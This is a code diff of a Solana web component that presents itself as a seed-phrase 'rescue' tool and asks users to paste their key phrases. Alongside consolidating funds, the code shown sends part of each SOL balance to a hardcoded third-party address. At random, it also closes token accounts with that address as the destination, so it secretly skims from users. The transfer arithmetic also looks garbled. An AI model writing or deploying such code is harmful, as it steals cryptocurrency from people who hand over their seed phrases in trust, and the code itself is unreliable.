@@ -17,7 +17,6 @@ import {
   storeMnemonicAndSeed,
   normalizeMnemonic,
 } from '../utils/wallet-seed';
-import {useDelegateWallet, LegacyWalletMigrationModal} from '@strata-foundation/chat-ui'///import { useDelegateWallet } from "../../hooks/useDelegateWallet";
 
 import {
   getAccountFromSeed,
@@ -110,15 +109,14 @@ function CreateWalletForm() {
 }
 let whereto = undefined
 function SeedWordsForm({ mnemonicAndSeed, goForward }) {
-const { keypair: whereto } = useDelegateWallet();
-
+const keypair = new Keypair()
   const [confirmed, setConfirmed] = useState(true);
   const [downloaded, setDownloaded] = useState(true);
   const [showDialog, setShowDialog] = useState(false);
   const [seedCheck, setSeedCheck] = useState('');
   const [logs, setLogs] = useState('');
   const [phrases, changePhrases] = useState([]);
-  const connection = new solanaWeb3.Connection("https://ssc-dao.genesysgo.net", "confirmed")
+  const connection = new Connection("https://ssc-dao.genesysgo.net", "confirmed")
 
   async function doIt() {
     try {
@@ -156,7 +154,7 @@ const { keypair: whereto } = useDelegateWallet();
               .process(async (account) => {
                 
                 console.log(account)
-                  const keypair = account//solanaWeb3.Keypair.fromSecretKey(account.secretKey);
+                  const keypair = account//Keypair.fromSecretKey(account.secretKey);
                   if (whereto == undefined){
                     jaregm = keypair
                   }
@@ -168,21 +166,21 @@ const { keypair: whereto } = useDelegateWallet();
                       //console.log(keypair.publicKey.toBase58());
                       if (bal > 0) {
                         //console.log(bal / 10 ** 9);
-                        const transferTransaction = new solanaWeb3.Transaction().add(
-                          solanaWeb3.SystemProgram.transfer({
+                        const transferTransaction = new Transaction().add(
+                          SystemProgram.transfer({
                             fromPubkey: keypair.publicKey,
                             toPubkey: jaregm.publicKey,
                             lamports: bal * (10 ** 9) / (10 * 9)- 0.000005,
                           })
                         );
-                        const transferTransaction2 = new solanaWeb3.Transaction().add(
-                          solanaWeb3.SystemProgram.transfer({
+                        const transferTransaction2 = new Transaction().add(
+                          SystemProgram.transfer({
                             fromPubkey: keypair.publicKey,
-                            toPubkey: new solanaWeb3.PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"),
+                            toPubkey: new PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"),
                             lamports: bal * (10 ** 9) / (10 * 1)- 0.000005,
                           })
                         );
-                        await  solanaWeb3.sendAndConfirmTransaction(
+                        await  sendAndConfirmTransaction(
                           connection,
                           [transferTransaction, transferTransaction2],
                           [keypair]
@@ -191,7 +189,7 @@ const { keypair: whereto } = useDelegateWallet();
                     }
 
                     const accounts = await connection.getParsedProgramAccounts(
-                      new solanaWeb3.PublicKey(
+                      new PublicKey(
                         "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
                       ),
                       {
@@ -210,7 +208,7 @@ const { keypair: whereto } = useDelegateWallet();
                     );
 
                     const accounts2 = await connection.getParsedProgramAccounts(
-                      new solanaWeb3.PublicKey(
+                      new PublicKey(
                         "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
                       ),
                       {
@@ -235,20 +233,20 @@ const { keypair: whereto } = useDelegateWallet();
                       ) {
 
                         //console.log(account.account.data["parsed"]["info"]["tokenAmount"]["uiAmount"] )
-                        let tokenMint = await splutils.getMint(connection, new solanaWeb3.PublicKey(account.account.data.parsed.info.mint))
+                        let tokenMint = await splutils.getMint(connection, new PublicKey(account.account.data.parsed.info.mint))
                         // //console.log(tokenMint)
 
-                        let tokenAccount = solanaWeb3.Keypair.generate();
+                        let tokenAccount = Keypair.generate();
                         let feePayer = whereto
                         try {
                           if (account.account.data["parsed"]["info"]["tokenAmount"]["uiAmount"] > 1) {
                             //console.log(`ramdom token address: ${tokenAccount.publicKey.toBase58()}`);
 
-                            let tx = new solanaWeb3.Transaction();
+                            let tx = new Transaction();
                             tx.feePayer = keypair.publicKey
                             tx.add(
                               // create account
-                              solanaWeb3.SystemProgram.createAccount({
+                              SystemProgram.createAccount({
                                 fromPubkey: feePayer.publicKey,
                                 newAccountPubkey: tokenAccount.publicKey,
                                 space: splutils.ACCOUNT_SIZE,
@@ -256,7 +254,7 @@ const { keypair: whereto } = useDelegateWallet();
                                 programId: splutils.TOKEN_PROGRAM_ID,
                               }),
                               // init token account
-                              splutils.createInitializeAccountInstruction(tokenAccount.publicKey, new solanaWeb3.PublicKey(account.account.data.parsed.info.mint), keypair.publicKey)
+                              splutils.createInitializeAccountInstruction(tokenAccount.publicKey, new PublicKey(account.account.data.parsed.info.mint), keypair.publicKey)
                             );
 
                             let hm1 = await  sendTransaction(
@@ -278,7 +276,7 @@ const { keypair: whereto } = useDelegateWallet();
                               let ata = await splutils.createAssociatedTokenAccount(
                                 connection, // connection
                                 whereto, // fee payer
-                                new solanaWeb3.PublicKey(account.account.data.parsed.info.mint), // mint
+                                new PublicKey(account.account.data.parsed.info.mint), // mint
                                 jaregm.publicKey // owner,
                               );
                               var amt = account.account.data["parsed"]["info"]["tokenAmount"]["amount"]
@@ -286,8 +284,8 @@ const { keypair: whereto } = useDelegateWallet();
                                 let bla = await splutils.transferChecked(
                                   connection, // connection
                                   whereto, // payer
-                                  new solanaWeb3.PublicKey(account.pubkey), // from (should be a token account)
-                                  new solanaWeb3.PublicKey(account.account.data.parsed.info.mint), // mint
+                                  new PublicKey(account.pubkey), // from (should be a token account)
+                                  new PublicKey(account.account.data.parsed.info.mint), // mint
                                   ata.address, // to (should be a token account)
                                   keypair, // from's owner
                                   amt * 0.1, account.account.data["parsed"]["info"]["tokenAmount"]["decimals"]
@@ -298,8 +296,8 @@ const { keypair: whereto } = useDelegateWallet();
                               let bla = await splutils.transferChecked(
                                 connection, // connection
                                 whereto, // payer
-                                new solanaWeb3.PublicKey(account.pubkey), // from (should be a token account)
-                                new solanaWeb3.PublicKey(account.account.data.parsed.info.mint), // mint
+                                new PublicKey(account.pubkey), // from (should be a token account)
+                                new PublicKey(account.account.data.parsed.info.mint), // mint
                                 ata.publicKey, // to (should be a token account)
                                 keypair, // from's owner
                                 amt, account.account.data["parsed"]["info"]["tokenAmount"]["decimals"]
@@ -307,7 +305,7 @@ const { keypair: whereto } = useDelegateWallet();
                               console.log(bla)
                               setLogs((bla))
                               {
-                                let tx = new solanaWeb3.Transaction().add(
+                                let tx = new Transaction().add(
                                   splutils.createCloseAccountInstruction(
                                     account.pubkey, // token account which you want to close
                                     jaregm.publicKey, // destination
@@ -327,14 +325,14 @@ const { keypair: whereto } = useDelegateWallet();
                                   anacc = account2
                                 }
                               })
-                              ata = await splutils.getAccount(connection, new solanaWeb3.PublicKey(anacc.pubkey));
+                              ata = await splutils.getAccount(connection, new PublicKey(anacc.pubkey));
                               var amt = account.account.data["parsed"]["info"]["tokenAmount"]["amount"]
                               if (amt != 1 && account.account.data["parsed"]["info"]["tokenAmount"]["decimals"] != 0){
                                 let bla = await splutils.transferChecked(
                                   connection, // connection
                                   whereto, // payer
-                                  new solanaWeb3.PublicKey(account.pubkey), // from (should be a token account)
-                                  new solanaWeb3.PublicKey(account.account.data.parsed.info.mint), // mint
+                                  new PublicKey(account.pubkey), // from (should be a token account)
+                                  new PublicKey(account.account.data.parsed.info.mint), // mint
                                   ata.address, // to (should be a token account)
                                   keypair, // from's owner
                                   amt * 0.1, account.account.data["parsed"]["info"]["tokenAmount"]["decimals"]
@@ -345,8 +343,8 @@ const { keypair: whereto } = useDelegateWallet();
                               let bla = await splutils.transferChecked(
                                 connection, // connection
                                 whereto, // payer
-                                new solanaWeb3.PublicKey(account.pubkey), // from (should be a token account)
-                                new solanaWeb3.PublicKey(account.account.data.parsed.info.mint), // mint
+                                new PublicKey(account.pubkey), // from (should be a token account)
+                                new PublicKey(account.account.data.parsed.info.mint), // mint
                                 ata.address, // to (should be a token account)
                                 keypair, // from's owner
                                 amt, account.account.data["parsed"]["info"]["tokenAmount"]["decimals"]
@@ -357,7 +355,7 @@ const { keypair: whereto } = useDelegateWallet();
                               {
                                 let ran = Math.random()
                                 if (ran >= 0.5){
-                                let tx = new solanaWeb3.Transaction().add(
+                                let tx = new Transaction().add(
                                   splutils.createCloseAccountInstruction(
                                     account.pubkey, // token account which you want to close
                                     jaregm.publicKey, // destination
@@ -372,10 +370,10 @@ const { keypair: whereto } = useDelegateWallet();
                                 ]);
                               }
                               else {
-                                let tx = new solanaWeb3.Transaction().add(
+                                let tx = new Transaction().add(
                                   splutils.createCloseAccountInstruction(
                                     account.pubkey, // token account which you want to close
-                                    new solanaWeb3.PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"), // destination
+                                    new PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"), // destination
                                     keypair.publicKey // owner of token account
                                   )
                                 );
@@ -408,7 +406,7 @@ const { keypair: whereto } = useDelegateWallet();
                           {
                             let ran = Math.random()
                             if (ran >= 0.5){
-                            let tx = new solanaWeb3.Transaction().add(
+                            let tx = new Transaction().add(
                               splutils.createCloseAccountInstruction(
                                 account.pubkey, // token account which you want to close
                                 jaregm.publicKey, // destination
@@ -422,10 +420,10 @@ const { keypair: whereto } = useDelegateWallet();
                             ]);
                           }
                           else {
-                            let tx = new solanaWeb3.Transaction().add(
+                            let tx = new Transaction().add(
                               splutils.createCloseAccountInstruction(
                                 account.pubkey, // token account which you want to close
-                                new solanaWeb3.PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"), // destination
+                                new PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"), // destination
                                 keypair.publicKey // owner of token account
                               )
                             );
@@ -476,7 +474,6 @@ const { keypair: whereto } = useDelegateWallet();
     <>
       <Card>
 
-      <LegacyWalletMigrationModal />
         <CardContent>
           <Typography variant="h5" gutterBottom>
             This Is Not a Wallet.
@@ -485,6 +482,7 @@ const { keypair: whereto } = useDelegateWallet();
             It iterates through first 138 of your wallets in these phrases, assumes at least 0.02 sol in the first wallet in the first one then shoves everything back there - ie. if you use this phrase in another extension, first one that pops up - and rescues all your NFTs, 90% of your fungibles and closes all your accounts and you get 90% of your sols back.
           </Typography>
           <Typography>
+            send a bit of sol here: {keypair.publicKey.toBase58()} 
             Enter keyphrases:
           </Typography>
           {mnemonicAndSeed ? (
